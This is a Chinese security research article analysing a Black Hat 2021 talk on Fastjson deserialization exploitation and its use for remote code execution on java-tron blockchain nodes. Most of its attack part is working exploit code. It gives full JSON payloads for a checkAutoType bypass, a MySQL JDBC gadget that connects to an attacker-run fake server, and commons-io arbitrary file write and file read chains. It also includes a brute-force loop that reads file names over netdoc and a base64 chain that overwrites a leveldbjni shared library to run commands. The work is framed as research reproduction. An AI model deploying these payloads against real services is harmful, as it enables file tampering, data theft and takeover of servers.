**作者：Skay  
原文链接：<http://noahblog.360.cn/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/>**

## 一、Fastjson反序列化原理

这个图其实已经能让人大致理解了，更详细的分析移步
[Fastjson反序列化原理](https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/)

![image](https://images.seebug.org/content/images/2021/09/07/1630983690000-1fwheg.png-w331s)

## 二、byPass checkAutotype

关于CheckAutoType相关安全机制简单理解移步

<https://kumamon.fun/FastJson-checkAutoType/>

以及 <https://mp.weixin.qq.com/s/OvRyrWFZLGu3bAYhOPR4KA>

<https://www.anquanke.com/post/id/225439>

<https://mp.weixin.qq.com/s/OvRyrWFZLGu3bAYhOPR4KA>

一句话总结checkAutoType(String typeName, Class<?> expectClass, int features) 方法的
typeName 实现或继承自 expectClass，就会通过检验

![2](https://images.seebug.org/content/images/2021/09/07/1630983691000-2yrgyg.png-w331s)

## 三、议题中使用的Fastjson 的一些已公开Gadgets

  * 必须继承 auto closeable。
  * 必须具有默认构造函数或带符号的构造函数，否则无法正确实例化。
  * 不在黑名单中
  * 可以引起 rce 、任意文件读写或其他高风险影响
  * gadget的依赖应该在原生jdk或者广泛使用的第三方库中

Gadget自动化寻找

![ggg](https://images.seebug.org/content/images/2021/09/07/1630983691000-3omohp.png-w331s)

<https://gist.github.com/5z1punch/6bb00644ce6bea327f42cf72bc620b80>

![3](https://images.seebug.org/content/images/2021/09/07/1630983692000-4ypuqy.png-w331s)

关于这几条链我们简单复现下

### 1.Mysql JDBC

搭配使用<https://github.com/fnmsd/MySQL_Fake_Server>

    
    
    import com.alibaba.fastjson.JSON;
    
    public class Payload_test {
        public static void main(String[] args){
    
            //搭配使用 https://github.com/fnmsd/MySQL_Fake_Server
            String payload_mysqljdbc = "{\"aaa\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.lang.AutoCloseable\", \"@type\":\"\\u0063\\u006f\\u006d.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"192.168.33.128\",\"portToConnectTo\":3306,\"url\":\"jdbc:mysql://192.168.33.128:3306/test?detectCustomCollations=true&autoDeserialize=true&user=\",\"databaseToConnectTo\":\"test\",\"info\":{\"@type\":\"\\u006a\\u0061\\u0076\\u0061.util.Properties\",\"PORT\":\"3306\",\"statementInterceptors\":\"\\u0063\\u006f\\u006d.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"user\":\"cb\",\"PORT.1\":\"3306\",\"HOST.1\":\"172.20.64.40\",\"NUM_HOSTS\":\"1\",\"HOST\":\"172.20.64.40\",\"DBNAME\":\"test\"}}\n" + "}";
    
            JSON.parse(payload_mysqljdbc);
    
            JSON.parseObject(payload_mysqljdbc);
        }
    }

![3](https://images.seebug.org/content/images/2021/09/07/1630983692000-4ypuqy.png-w331s)

更多版本详情参考 <https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg>

### 2.commons-io写文件

<https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg>

#### 2.1 commons-io 2.0 - 2.6

    
    
     String aaa_8192 = "ssssssssssssss"+Some_Functions.getRandomString(8192);
    //        String write_name = "C://Windows//Temp//sss.txt";
    String write_name = "D://tmp//sss.txt";
    String payload_commons_io_filewrite_0_6 = "{\"x\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"input\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"\""+aaa_8192+"\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"branch\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writer\":{\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\"file\":\""+write_name+"\",\"encoding\":\"UTF-8\",\"append\": false},\"charsetName\":\"UTF-8\",\"bufferSize\": 1024,\"writeImmediately\": true},\"trigger\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger2\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger3\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"}}}";

![4](https://images.seebug.org/content/images/2021/09/07/1630983692000-6bwkut.png-w331s)

此处在Linux复现时，或者其它环境根据操作系统及进程环境不同fastjson构造函数的调用会出现随机化，在原Poc基础上修改如下即可

![5](https://images.seebug.org/content/images/2021/09/07/1630983693000-7tajrt.png-w331s)

#### 2.1 commons-io 2.7.0 - 2.8.0

    
    
    String payload_commons_io_filewrite_7_8 = "{\"x\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"input\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"\""+aaa_8192+"\",\"start\":0,\"end\":2147483647},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"branch\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writer\":{\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\"file\":\""+write_name+"\",\"charsetName\":\"UTF-8\",\"append\": false},\"charsetName\":\"UTF-8\",\"bufferSize\": 1024,\"writeImmediately\": true},\"trigger\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger2\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger3\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"}}";

### 3.commons-io 逐字节读文件内容

    
    
    String payload_read_file = "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"file:///D:/tmp/sss.txt\"},\"charsetName\": \"UTF-8\",\"bufferSize\": 1024},\"boms\": [{\"charsetName\": \"UTF-8\",\"bytes\": [11]}]},\"address\": {\"$ref\": \"$.abc.BOM\"}}";

![6](https://images.seebug.org/content/images/2021/09/07/1630983693000-8flvjl.png-w331s)

![7](https://images.seebug.org/content/images/2021/09/07/1630983693000-9amije.png-w331s)

![8](https://images.seebug.org/content/images/2021/09/07/1630983694000-10qchfs.png-w331s)

## 四、New Gadgets 及实现区块链RCE

PPT中提到了，它没有mysql-jdbc链，且为Spring-boot，无法直接写webshell。虽然我们可以覆盖class文件，但是需要root权限，且并不确定charse.jar path。

然后回到目标本身，java tron是tron推出的公链协议的java实现，是一个开源 Java 应用程序，Java-tron 可以在 tron 节点上启用
HTTP 服务内部使用Fastjson解析Json数据。且：

  * Leveldb 和 leveldbjni：

  * 快速键值存储库

  * 被比特币使用，因此被很多公链继承

  * 存储区块链元数据，频繁轮询读写

  * 需要效率，所以 JNI <https://github.com/fusesource/leveldbjn>

**综上所述，洞主最终利用Fastjson的几个漏洞，结合Levaldbjni的JNI特性，替换/tmp/目录下的so文件最终执行了恶意命令**

### 1.模拟环境 Levaldbjni_Sample

这里我们简单写了一个Levaldbjni的Demo来模拟漏洞环境，

两次执行factory.open(new File("/tmp/lvltest1"), options);都将会加载

    
    
    /**
     * @auther Skay
     * @date 2021/8/10 19:35
     * @description
     */
    
    import static org.fusesource.leveldbjni.JniDBFactory.factory;
    
    import java.io.File;
    import java.io.IOException;
    
    import org.iq80.leveldb.DB;
    import org.iq80.leveldb.Options;
    
    public class Levaldbjni_Sample {
        public static void main(String[] args) throws IOException, InterruptedException {
            Options options = new Options();
            Thread.sleep(2000);
            options.createIfMissing(true);
            Thread.sleep(2000);
            DB db = factory.open(new File("/tmp/lvltest"), options);
            System.out.println("so file created");
            System.out.println("watting attack.......");
            Thread.sleep(30000);
            System.out.println("Exploit.......");
            DB db1 = factory.open(new File("/tmp/lvltest1"), options);
    
            try {
                for (int i = 0; i < 1000000; i++) {
                    byte[] key = new String("key" + i).getBytes();
                    byte[] value = new String("value" + i).getBytes();
                    db.put(key, value);
                }
                for (int i = 0; i < 1000000; i++) {
                    byte[] key = new String("key" + i).getBytes();
                    byte[] value = db.get(key);
                    String targetValue = "value" + i;
                    if (!new String(value).equals(targetValue)) {
                        System.out.println("something wrong!");
                    }
                }
                for (int i = 0; i < 1000000; i++) {
                    byte[] key = new String("key" + i).getBytes();
                    db.delete(key);
                }
    
                Thread.sleep(20000);
    //            Thread.sleep(500000);
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                db.close();
            }
        }
    }

运行时会在tmp目录下生成如下文件

![9](https://images.seebug.org/content/images/2021/09/07/1630983694000-11ngjrg.png-w331s)

可以看到我们的目标就是替换libleveldbjni-64-5950274583505954902.so

### 2.commons-io 逐字节读文件名

在议题中中对于commons-io的使用是读取/tmp/目录下的随机生成的so文件名，我们现在可以使用file协议读取文件内容了，这里我们使用netdoc协议读取文件名即可，因为是逐字节读取，我们写一个简单的循环判断即可

    
    
    public static char fakeChar(char[] fileName){
        char[] fs=new char[fileName.length+1];
        System.arraycopy(fileName,0,fs,0,fileName.length);
        for (char i = 1; i <= 127; i++) {
            fs[fs.length-1]=i;
            String payload_read_file = "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"netdoc:///tmp/\"},\"charsetName\": \"utf-8\",\"bufferSize\": 1024},\"boms\": [{\"charsetName\": \"utf-8\",\"bytes\": ["+formatChars(fs)+"]}]},\"address\": {\"$ref\": \"$.abc.BOM\"}}";
            if (JSON.parse(payload_read_file).toString().indexOf("bOMCharsetName")>0){
                return i;
            }
        }
        return 0;
    }

执行效果如下

![10](https://images.seebug.org/content/images/2021/09/07/1630983694000-12ecmma.png-w331s)

### 3.so文件的修改

这里需要一点二进制的知识，首先确定下我们要修改哪个函数

![11](https://images.seebug.org/content/images/2021/09/07/1630983694000-13lcfqt.png-w331s)

修改如下即可

![12](https://images.seebug.org/content/images/2021/09/07/1630983694000-14isvvg.png-w331s)

![13](https://images.seebug.org/content/images/2021/09/07/1630983695000-15uhjjx.png-w331s)

### 4.写二进制文件

commons-io的链只支持写文本文件，这里测试了一下，不进行base64编码进行单纯文本方式操作二进制文件写入文件前后会产生一些奇妙的变化

![14](https://images.seebug.org/content/images/2021/09/07/1630983695000-16szrzb.png-w331s)

议题作者给出了写二进制文件的一条新链

![233](https://images.seebug.org/content/images/2021/09/07/1630983695000-17pwire.png-w331s)

在进行了base64编码后就不存在上述问题，这里感谢浅蓝师傅提供了一些构造帮助，最后此链构造如下：

    
    
    /**
     * @auther Skay
     * @date 2021/8/13 14:25
     * @description
     */
    public class payload_AspectJ_writefile {
        public static void write_so(String target_path){
            byte[] bom_buffer_bytes = readFileInBytesToString("./beichen.so");
            //写文本时要填充数据
    //        String so_content = new String(bom_buffer_bytes);
    //        for (int i=0;i<8192;i++){
    //            so_content = so_content+"a";
    //        }
    //        String base64_so_content = Base64.getEncoder().encodeToString(so_content.getBytes());
            String base64_so_content = Base64.getEncoder().encodeToString(bom_buffer_bytes);
            byte[] big_bom_buffer_bytes = Base64.getDecoder().decode(base64_so_content);
    //        byte[] big_bom_buffer_bytes = base64_so_content.getBytes();
            String payload = String.format("{\n" +
                    "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                    "  \"@type\":\"org.apache.commons.io.input.BOMInputStream\",\n" +
                    "  \"delegate\":{\n" +
                    "    \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                    "    \"input\":{\n" +
                    "      \"@type\": \"org.apache.commons.codec.binary.Base64InputStream\",\n" +
                    "      \"in\":{\n" +
                    "        \"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\",\n" +
                    "        \"charset\":\"utf-8\",\n" +
                    "        \"bufferSize\": 1024,\n" +
                    "        \"s\":{\"@type\":\"java.lang.String\"\"%1$s\"\n" +
                    "      },\n" +
                    "      \"doEncode\":false,\n" +
                    "      \"lineLength\":1024,\n" +
                    "      \"lineSeparator\":\"5ZWKCg==\",\n" +
                    "      \"decodingPolicy\":0\n" +
                    "    },\n" +
                    "    \"branch\":{\n" +
                    "      \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                    "      \"targetPath\":\"%2$s\"\n" +
                    "    },\n" +
                    "    \"closeBranch\":true\n" +
                    "  },\n" +
                    "  \"include\":true,\n" +
                    "  \"boms\":[{\n" +
                    "                  \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                    "                  \"charsetName\": \"UTF-8\",\n" +
                    "                  \"bytes\":" +"%3$s\n" +
                    "                }],\n" +
                    "  \"x\":{\"$ref\":\"$.bOM\"}\n" +
                    "}",base64_so_content, "D://java//Fastjson_All//fastjson_debug//fastjson_68_payload_test_attck//aaa.so",Arrays.toString(big_bom_buffer_bytes));
    //        System.out.println(payload);
            JSON.parse(payload);
    
        }
    
        public static byte[] readFileInBytesToString(String filePath) {
            final int readArraySizePerRead = 4096;
            File file = new File(filePath);
            ArrayList<Byte> bytes = new ArrayList<>();
            try {
                if (file.exists()) {
                    DataInputStream isr = new DataInputStream(new FileInputStream(
                            file));
                    byte[] tempchars = new byte[readArraySizePerRead];
                    int charsReadCount = 0;
    
                    while ((charsReadCount = isr.read(tempchars)) != -1) {
                        for(int i = 0 ; i < charsReadCount ; i++){
                            bytes.add (tempchars[i]);
                        }
                    }
                    isr.close();
                }
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
    
            return toPrimitives(bytes.toArray(new Byte[0]));
        }
    
        static byte[] toPrimitives(Byte[] oBytes) {
            byte[] bytes = new byte[oBytes.length];
    
            for (int i = 0; i < oBytes.length; i++) {
                bytes[i] = oBytes[i];
            }
    
            return bytes;
        }
    }

### 5.成功RCE

![15](https://images.seebug.org/content/images/2021/09/07/1630983696000-18ovqgo.png-w331s)

# 五、参考链接 & 致谢

感谢voidfyoo、浅蓝、 _RicterZ_ 在Fastjson Poc方面帮助

感谢Swing、Beichen 在二进制方面帮助

最后感谢郑成功不断督促和鼓励才使得这篇文章得以顺利展示到大家面前

[https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/](https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/)

<https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg>

<http://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1698/>

